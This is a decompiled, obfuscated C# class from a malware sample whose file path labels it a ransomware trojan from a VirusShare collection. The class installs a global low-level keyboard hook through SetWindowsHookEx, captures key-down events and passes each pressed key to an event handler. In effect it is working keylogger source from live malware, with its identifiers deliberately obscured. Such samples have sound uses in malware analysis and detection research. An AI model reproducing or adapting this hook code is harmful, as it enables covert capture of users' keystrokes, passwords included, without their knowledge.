// Decompiled with JetBrains decompiler
// Type: ʏ�垡⋇䑃
// Assembly: uzjSR5XnMreRD, Version=2.6.1.2, Culture=neutral, PublicKeyToken=null
// MVID: 8F87B908-3642-4B60-8D81-E7A9714E6A58
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-f62f12aa2fcfd0604e2da1c0a0341d35694eb312105b442d408e4e376a93df3b.exe

using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class ʏ\uFFFD\uE65B\uE7B7\uF87B垡\u22C7䑃
{
  private const int 聪ዶ锯棧軅ꘚ塃掑 = 13;
  private const int \uEA6A嗣\uEEB8\uEFAD\u2379쾽\u1CB0᷑ = 0;
  private const int 觱䎺忓봸\u3297唗筈育 = 256;
  private const int 틀톞鴴\u05CC\uE775ဍ\u329C\uE5B5 = 257;
  private const int \u08DE낍\uFDE0鑷踪뢊ᆞᚾ = 260;
  private const int 퍽ু騜頟\uF069㤡恵Ά = 261;
  private ʏ\uFFFD\uE65B\uE7B7\uF87B垡\u22C7䑃.꾂\u1BF7\u29F6ࠞ춉嗆\u332B\uEBEA 䣜公\uE525ﲉ\u0F2C늴ℜﬅ;
  private IntPtr \u1CD0\uF145ţ튛ꩬ\u2FCA\uF31F\u2EA2;

  [DllImport("User32.dll", EntryPoint = "SetWindowsHookEx", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
  private static extern int ᛝᮯ죄ჷ箉䖯ᬆ坁(
    int _param0,
    ʏ\uFFFD\uE65B\uE7B7\uF87B垡\u22C7䑃.꾂\u1BF7\u29F6ࠞ춉嗆\u332B\uEBEA 蔓긿낽袸䝤싕맯俚,
    IntPtr _param2,
    int _param3);

  [DllImport("User32.dll", EntryPoint = "CallNextHookEx", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
  private static extern int ㄖ㥼曻\u0DC9쓴鸁슱鯬(
    int _param0,
    int _param1,
    IntPtr _param2,
    IntPtr _param3);

  public static event ʏ\uFFFD\uE65B\uE7B7\uF87B垡\u22C7䑃.\u26CE繼ꜛ鼒ꃇ눵ﱛꇼ 촒뉾럘灞磙ฦ鑘䛥;

  private int 旮괺௫\u240E哘\u2ED2\u23DB\uE9AB(int _param1, IntPtr _param2, IntPtr _param3)
  {
    if (_param1 == 0)
      goto label_2;
label_1:
    return 囖㑃뺽뇠ﮀ\uF6FB\uF73E腘.Ꚑ\u0C72藵勰資\u192F潴귽(浤솑\uFFFD켅ᇛ\u00A6닂鳧.伲霏\u2260㼄㵖劆ἄⅆ(IntPtr.Zero), _param1, _param2, _param3);
label_2:
    IntPtr num = _param2;
    if (쎔\uA83F\uFFFD\u27BA\u21C8퐔陕讍.짬띗繨ꤙ驌ꜚ눬㼳(num, \u28DC결ַ퓽ᢺ䆲\uEC3A䈔.\u0D58㠂繌\uE87A턔ᅖ傯좲(256)) || 쎔\uA83F\uFFFD\u27BA\u21C8퐔陕讍.짬띗繨ꤙ驌ꜚ눬㼳(num, \u28DC결ַ퓽ᢺ䆲\uEC3A䈔.\u0D58㠂繌\uE87A턔ᅖ傯좲(260)))
    {
      ʏ\uFFFD\uE65B\uE7B7\uF87B垡\u22C7䑃.\u26CE繼ꜛ鼒ꃇ눵ﱛꇼ 貵譑摩ꉮ띮짅풿 = ʏ\uFFFD\uE65B\uE7B7\uF87B垡\u22C7䑃.貵譑摩ꉮ띮짅풿\uEDD6;
      if (貵譑摩ꉮ띮짅풿 != null)
      {
        ʏ\uFFFD\uE65B\uE7B7\uF87B垡\u22C7䑃.\u26CE繼ꜛ鼒ꃇ눵ﱛꇼ 繼ꜛ鼒ꃇ눵ﱛꇼ = 貵譑摩ꉮ띮짅풿;
        ʏ\uFFFD\uE65B\uE7B7\uF87B垡\u22C7䑃.봐\u2BFC殟㮇㮟쮞韈줬 봐殟㮇㮟쮞韈줬1;
        object obj = \uFFFD溦䓞콺ᕿٻ猶呶.晼驿㸙\u2FED瑲\u066C\uEFE1胧(_param3, ᆔኾꗘ몇砍섕뢅\u32D0.\uE12E\uF423ꍨ脱\uFFFD쇧\uFE5E\uE31D((object) 봐殟㮇㮟쮞韈줬1));
        ʏ\uFFFD\uE65B\uE7B7\uF87B垡\u22C7䑃.봐\u2BFC殟㮇㮟쮞韈줬 봐殟㮇㮟쮞韈줬2;
        int 芲漡累ᩩ绸㵂ﴔ = checked ((int) (unchecked (obj != null) ? (ʏ\uFFFD\uE65B\uE7B7\uF87B垡\u22C7䑃.봐\u2BFC殟㮇㮟쮞韈줬) obj : 봐殟㮇㮟쮞韈줬2).芲漡累ᩩ绸\uE763㵂ﴔ);
        ꡣ䪊鈏᪼珲ட憑\uE02F.自뎽ꢘꅃ逡\u26C7씷䏴((object) 繼ꜛ鼒ꃇ눵ﱛꇼ, (Keys) 芲漡累ᩩ绸㵂ﴔ);
        goto label_1;
      }
      else
        goto label_1;
    }
    else
      goto label_1;
  }

  public ʏ\uFFFD\uE65B\uE7B7\uF87B垡\u22C7䑃()
  {
    ʏ\uFFFD\uE65B\uE7B7\uF87B垡\u22C7䑃 TargetObject = this;
    // ISSUE: virtual method pointer
    this.䣜公\uE525ﲉ\u0F2C늴ℜﬅ = new ʏ\uFFFD\uE65B\uE7B7\uF87B垡\u22C7䑃.꾂\u1BF7\u29F6ࠞ춉嗆\u332B\uEBEA((object) TargetObject, __vmethodptr(TargetObject, 旮괺௫\u240E哘\u2ED2\u23DB\uE9AB));
    this.\u1CD0\uF145ţ튛ꩬ\u2FCA\uF31F\u2EA2 = IntPtr.Zero;
    this.\u1CD0\uF145ţ튛ꩬ\u2FCA\uF31F\u2EA2 = \u28DC결ַ퓽ᢺ䆲\uEC3A䈔.\u0D58㠂繌\uE87A턔ᅖ傯좲(髡绮꣘퉫栙輼\uED1A鴙.\uF58D\uE803䝟峌钅砞\u0CD9ੌ(13, this.䣜公\uE525ﲉ\u0F2C늴ℜﬅ, \u28DC결ַ퓽ᢺ䆲\uEC3A䈔.\u0D58㠂繌\uE87A턔ᅖ傯좲(㞨冈爁\uF331罜\uF6F3䂻䠻.堠逑獹ꥷআᖀⰸꏦ(Գ䢽\u1CA5\u0608\uE96Dꨥ\u9FEAઉ.옙﨣\u09C6荪鑸딇粨\u204F((object) \u20FB\uAB1D\u3228燽\u2B8Aꭎⱘ녧.\uEA74먪珢遊샲Ⴎ\u0FD9\uF809())[0]).ToInt32()), 0));
  }

  private struct 봐\u2BFC殟㮇㮟쮞韈줬
  {
    public uint 芲漡累ᩩ绸\uE763㵂ﴔ;
    public uint ޅ\uE1D6譳\uE9B1祸\uF6D4컱줔;
    public ʏ\uFFFD\uE65B\uE7B7\uF87B垡\u22C7䑃.\uA8C9뉬蝦\u0C7C揶\u08C6\uE40C㟻 鼃澵\uABFD\uFFFD\uFBCF\u28B5\u2A63寒;
    public uint 喦秧鉦\u2279쏞컐ᶭɧ;
    public UIntPtr 庈\uF4C5受퐹岀䛻\u309B枟;
  }

  [Flags]
  private enum \uA8C9뉬蝦\u0C7C揶\u08C6\uE40C㟻 : uint
  {
    qkPAbrA5QHSKJLJ = 1,
    LLKHF_INJECTED = 16, // 0x00000010
    LLKHF_ALTDOWN = 32, // 0x00000020
    LLKHF_UP = 128, // 0x00000080
  }

  public delegate void \u26CE繼ꜛ鼒ꃇ눵ﱛꇼ(Keys Key);

  private delegate int 꾂\u1BF7\u29F6ࠞ춉嗆\u332B\uEBEA(
    int wPfwuOw9cUBTKno,
    IntPtr pOimShmzTUNVeGT,
    IntPtr WJktOTelwe1LXL3);
}
